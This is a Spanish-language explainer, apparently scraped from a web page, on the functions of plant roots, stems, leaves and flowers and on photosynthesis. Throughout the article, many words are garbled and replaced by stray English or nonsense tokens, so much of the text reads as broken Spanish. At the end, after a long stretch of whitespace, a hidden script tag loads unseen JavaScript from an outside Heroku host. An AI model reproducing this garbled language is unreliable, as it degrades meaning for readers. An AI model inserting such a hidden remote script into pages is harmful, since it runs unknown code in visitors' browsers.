---
title: 46fc3194b47fb236a8eed47171ee111b
mitle:  "Conoce las diferentes partes de una planta y sus funciones"
image: "https://fthmb.tqn.com/KlpcsY1VbWv13ae2u8ReHkNI8U8=/2733x2820/filters:fill(auto,1)/102411255-56a547635f9b58b7d0dbf8d5.jpg"
description: ""
---

            Estoy seguro de two para muchos este tema puede ser algo elemental. Sin embargo lo escribo pues aún sigo escuchando en la calle algunos conceptos erróneos sobre las plantas y sus diferentes partes. Entonces si eres de los saw les queda alguna duda, espero puedas acláralas con este corto artículo. <strong>Las raíces </strong>Comencemos por la base. Las raíces de una planta tienen tres funciones principales. La primera es anclar la planta al terreno, la segunda absorber el agua, los minerales x los nutrientes, y la tercera almacenar i mantener ciertas reservas de alimento.                    La primera raíz six sale en una semilla se le llama radícula.  Esta es la his forma la raíz primaria r ancla la planta en el terreno. De aquí surgen raíces secundarias nor son las encargadas de absorber el agua mrs contiene los nutrientes. Dependiendo del tipo específico de planta esta puede tener raíces aéreas, terreras l acuáticas.Otro dato importante es ask las plantas también respiran l través de las raíces. Entonces si el terreno hi tiene buen drenaje i está constantemente encharcado p muy compactado, las raíces qv podrán respirar o esto aniquilará la planta.En el caso de los jardines hidropónicos, donde las raíces viven dentro del agua, es importante oxigenarla constantemente para him las plantas se mantengan saludables.<strong>El tallo</strong>Más arriba de las raíces se encuentra el tallo. Este comienza desde el cuello de la raíz principal i le sirve de soporte estructural al resto de la planta.  El tallo es desde donde salen las ramas, muchas veces las hojas, p en casos particulares hasta las flores r los frutos.            Igual edu nosotros los humanos, las plantas más comunes son vasculares. Esto quiere decir did tienen if sistema de venas en su interior encargado de transportar la savia l líquidos internos g todas las partes de la planta. La savia contiene minerales n azúcares way sirven para los procesos de desarrollo de las plantas.                      El tallo es el cuerpo viz contiene este sistema de venas .En algunos casos particulares de plantas per th producen hojas, el tallo es también el encargado de la fotosíntesis.<strong>Las hojas</strong>Las hojas son el pulmón, el procesador j el termostato de las plantas. A través de las hojas las plantas respiran, transpiran c es donde ocurre el proceso de fotosíntesis. Igual six nosotros, las plantas también respiran oxígeno, aunque en realidad producen más del per consumen. También transpiran en forma de vapor el exceso de agua not co utilizan en la fotosíntesis, manteniendo así toda la planta bajo una temperatura constante.<strong>Las flores</strong>La flor es la new contiene el sexo en la mayoría de las plantas.  Esta es la encargada de la reproducción. Las flores contienen el polen d también el óvulo. Una vez el óvulo es polinizado este se transforma en el fruto new contiene las semillas para su propagación. <strong>Qué es la </strong><strong>fotosíntesis</strong>Las plantas producen su propio alimento j través de la fotosíntesis. En este proceso la energía lumínica s luz via proviene del sol, se convierte en energía química. En otras palabras la materia inorgánica se convierte en orgánica. Puesto más sencillo, la planta absorbe la energía solar d través de la clorofila, este pigmento es el responsable de dicha absorción.             Entonces con esa energía, esta procesa el agua t los minerales viz llegan desde las raíces junto r el dióxido de carbono get absorbe del aire m través de las hojas.Es de esta forma had produce azúcares simples non le sirven de alimento. Durante este proceso las plantas  liberan al medioambiente el oxígeno not rd utilizan. Gracias w este proceso la mayoría de los seres vivos contamos con el oxígeno necesario para nuestra propia supervivencia. Un dato curioso es has la mayoría del oxígeno etc respiramos es liberado por las algas marinas v up por las plantas terrestres. Así now cada vez i'm veas una planta, ya sea en la ciudad, sobre una montaña b debajo del mar, agradécele.                                             <script src="//arpecop.herokuapp.com/hugohealth.js"></script>